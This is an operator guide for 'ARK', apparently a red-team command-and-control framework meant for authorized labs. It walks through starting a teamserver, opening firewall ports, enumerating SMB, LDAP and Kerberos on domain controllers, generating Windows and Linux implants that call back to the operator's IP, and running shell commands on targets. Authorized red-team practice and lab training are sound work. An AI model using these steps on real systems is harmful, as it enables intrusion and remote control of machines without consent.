# ARK operator guide

**Audience:** a new operator using ARK in an authorized lab.

Read this before dropping an implant. ARK is a C2, so command names matter: know which machine a command runs on and whether it needs a live session.

## Terms

| Name | Plain meaning | Runs on | Notes |
| --- | --- | --- | --- |
| **Teamserver** | The C2 server. It listens for implants and exposes the operator API. | Your operator box | Start with `ark teamserver`. Keep it running. |
| **Operator** | The human/CLI controlling ARK. | Your operator box | Use `ark operator` for the REPL or `ark op ...` for one-shot commands. |
| **Seat** | A client certificate identity for the operator API. | Your operator box | `operator` submits tasks. `approver` approves high-risk tasks. |
| **Approver** | The second seat used for dual control. | Your operator box | Required for high-risk actions like creds dump, lateral, persist, inject, PE load, and privesc. |
| **Listener** | The HTTPS or DNS endpoint implants call back to. | Teamserver | Fresh HTTPS config uses port **1750**. Existing `~/.ark/server.yaml` may still use another port. |
| **Callback** | The URL an implant uses to reach the listener. | Target to teamserver | Must be reachable from the target, usually your `tun0` IP in HTB. |
| **Implant** | The agent binary you run on the target after foothold. | Target | C is primary for Windows PE and Linux. Go Windows is fallback. Go Linux is archived. |
| **Session** | A checked-in implant you can task. | Teamserver/operator | No session means implant-only commands will not work. |
| **Host tools** | Recon and AD helpers that do not need an implant. | Your operator box | `ark ldap`, `ark smb`, `ark ad`, `ark kerberos`, `ark winrm`, etc. |
| **Secret / PSK** | The HMAC key that lets an implant authenticate. | Teamserver + implant | `ark op generate` registers it. Bare `make implant-c*` does not. |
| **404 on beacon** | Auth failed or non-implant traffic hit the listener. | Teamserver log explains why | See [OPERATOR_INBOUND.md](OPERATOR_INBOUND.md) for `unknown_implant`, `hmac`, `skew`, `replay`, and `parse`. |

## Command families

| Command | Use it when |
| --- | --- |
| `ark teamserver` | You want the daemon-only C2 server. Prefer this for labs. |
| `ark serve` | You want teamserver + operator REPL in one process. |
| `ark operator` | You want the interactive operator REPL. |
| `ark op ...` | You want one-shot commands from a script or terminal. |
| `ark certs seats` | You need operator + approver certificates. Run once per ARK home unless you reset certs. |
| `ark inbound ...` | You are checking listener/firewall/tunnel/SOCKS/drop path. |
| `ark ldap` / `ark smb` / `ark ad` / `ark kerberos` | You have creds or network access and do not need an implant yet. |
| REPL `shell`, `upload`, `download`, `ps`, `socks`, `lateral` | You already have a session selected with `use <id>`. |

## First run

### 1. Build ARK

```bash
make ark
```

Optional install:

```bash
make install
```

Use `./build/ark` below if you did not install.

### 2. Start the teamserver

```bash
./build/ark teamserver
```

Leave it running. Fresh configs listen on HTTPS **1750**. Existing configs are not rewritten, so check `~/.ark/server.yaml` or run:

```bash
./build/ark inbound status
```

### 3. Create seats and open an operator

In another terminal:

```bash
./build/ark certs seats
./build/ark operator
```

One-shot alternative:

```bash
./build/ark op sessions
```

If a high-risk task waits in `pending`, approve it from the approver seat:

```text
pending
approve <id>
```

For one-shots, ARK can use both seats locally:

```bash
./build/ark op shell -- whoami
```

### 4. Check inbound before building an implant

Get your callback IP:

```bash
ip -br a show tun0
```

Check listener/firewall state:

```bash
./build/ark inbound status
```

If the target cannot reach your HTTPS port, fix that before generating the implant. For Fedora/firewalld labs:

```bash
sudo firewall-cmd --add-port=1750/tcp
```

If the target only reaches a different port, use a redirector:

```bash
./build/ark inbound redirector start --listen 0.0.0.0:1750 --to 127.0.0.1:8443
```

### 5. Use host tools first when you have network access

These run from your operator box and do not need a C2 session:

```bash
./build/ark smb shares --host <DC> --anon
./build/ark ldap enum --dc <DC> --domain <DOM> --user <u> --pass-file ./pass.txt --type interesting
./build/ark kerberos skew --dc <DC>
```

Keep secrets in files. Avoid putting passwords directly in shell history.

### 6. Generate an implant

Use `ark op generate` because it builds the implant and registers the HMAC secret in the teamserver DB.

Windows C implant:

```bash
./build/ark op generate --os windows --language c \
  --callback https://<your-tun0-ip>:1750 \
  --out implant.exe
```

Linux C implant:

```bash
./build/ark op generate --os linux --language c \
  --callback https://<your-tun0-ip>:1750 \
  --out implant_c_linux
```

Do not use bare `make implant-c` / `make implant-c-linux` for a live drop unless you also register the secret with `ark op register-secret`.

### 7. Drop, run, and get a session

Copy the implant to the authorized target by whatever access you already have. After it runs:

```bash
./build/ark op sessions
./build/ark op shell -- whoami
```

REPL flow:

```text
sessions
use <session-id>
shell whoami
```

### 8. Clean up

```text
[ ] Kill the implant on the target
[ ] Stop SOCKS, redirectors, HTTP drops, and listeners you no longer need
[ ] Close SSH reverse tunnels
[ ] Remove temporary firewall rules if you added them
[ ] Confirm secrets and loot are not in git status
```

## Common confusion

| Symptom | Likely cause | Fix |
| --- | --- | --- |
| `sessions` is empty | Implant has not reached the listener | Check callback IP, firewalld, VPN, target egress, and teamserver logs. |
| Listener returns 404 | Normal for non-implant traffic or auth failure | Read teamserver log reason; see [OPERATOR_INBOUND.md](OPERATOR_INBOUND.md). |
| `unknown_implant` | Secret was not registered | Regenerate with `ark op generate` or register the Makefile secret. |
| `hmac` | Wrong secret/implant ID | Regenerate the implant and redeploy one copy. |
| `skew` | Operator/target/DC time mismatch | Sync clocks or account for skew before Kerberos/C2 work. |
| `shell` says no session | You used an implant command before selecting a session | Run `sessions`, then `use <id>`, or use `ark op shell`. |
| Go Linux generate fails | Go Linux is archived | Use `--language c --os linux`. |
| `ark serve` feels confusing | It combines teamserver and REPL | Use `ark teamserver` plus `ark operator` in separate terminals. |

## Next docs

| Need | Doc |
| --- | --- |
| Listener/firewall/auth/tunnel details | [OPERATOR_INBOUND.md](OPERATOR_INBOUND.md) |
| Host AD/SMB/Kerberos toolkit | [OPERATOR_PRE_IMPLANT.md](OPERATOR_PRE_IMPLANT.md) |
| AD engagement recipes | [AD_ENGAGEMENT.md](AD_ENGAGEMENT.md) |
| Implant capability plan | [IMPLANT_ROADMAP.md](IMPLANT_ROADMAP.md) |
